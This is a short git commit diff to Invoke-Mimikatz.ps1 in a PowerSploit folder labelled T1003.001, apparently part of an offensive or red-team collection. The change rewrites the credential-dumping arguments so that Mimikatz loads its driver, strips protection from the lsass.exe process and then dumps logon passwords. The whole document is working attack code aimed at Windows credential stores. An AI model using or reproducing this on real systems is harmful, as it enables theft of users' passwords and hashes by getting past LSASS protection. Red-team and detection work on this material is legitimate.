1aa6bd3c068f27917b5e28bfeca89cdc53b9eea1
zsy <ras@csie.io>
2024-06-04 12:17:41 +0800

    Invoke-Mimikatz.ps1

--- T1003.001/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1
+++ T1003.001/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1
@@ -2707,7 +2707,7 @@ Function Main
 
 	if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
 	{
-		$ExeArgs = "privilege::debug token::elevate sekurlsa::logonpasswords exit"
+		$ExeArgs = "!+ !processprotect `"/process:lsass.exe /remove`" sekurlsa::logonpasswords exit"
 	}
     elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
     {
